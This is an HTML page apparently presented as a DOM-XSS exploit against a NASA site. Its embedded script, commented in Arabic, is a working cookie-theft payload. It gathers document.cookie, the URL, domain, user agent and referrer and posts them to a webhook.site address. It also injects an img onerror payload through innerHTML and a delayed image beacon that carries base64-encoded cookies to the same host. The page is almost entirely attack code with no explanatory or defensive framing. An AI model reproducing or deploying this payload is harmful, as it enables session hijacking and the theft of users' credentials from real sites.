<!DOCTYPE html>
<html>
<head>
  <title>NASA DOM-XSS Exploit</title>
</head>
<body>
  <h2>Executing DOM-XSS Exploit...</h2>
  <script>
    // 🚀 استغلال location.hash → frameworkService.js
    let hashPayload = location.hash.replace('#', '');

    // ✅ جمع بيانات الجلسة
    const data = {
      cookies: document.cookie,
      url: location.href,
      domain: document.domain,
      userAgent: navigator.userAgent,
      referrer: document.referrer,
      timestamp: new Date().toISOString()
    };

    // 📡 إرسال البيانات إلى Webhook
    fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "XSS-Exfiltration", payload: hashPayload, info: data })
    });

    // 💉 تنفيذ عبر innerHTML
    const div = document.createElement('div');
    div.innerHTML = `<img src=x onerror=fetch('https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?c='+document.cookie)>`;
    document.body.appendChild(div);

    // ⏱ استغلال setTimeout من frameworkService.js
    setTimeout(() => {
      const i = document.createElement('img');
      i.src = 'https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?t=' + btoa(document.cookie);
      document.body.appendChild(i);
    }, 1500);
  </script>
</body>
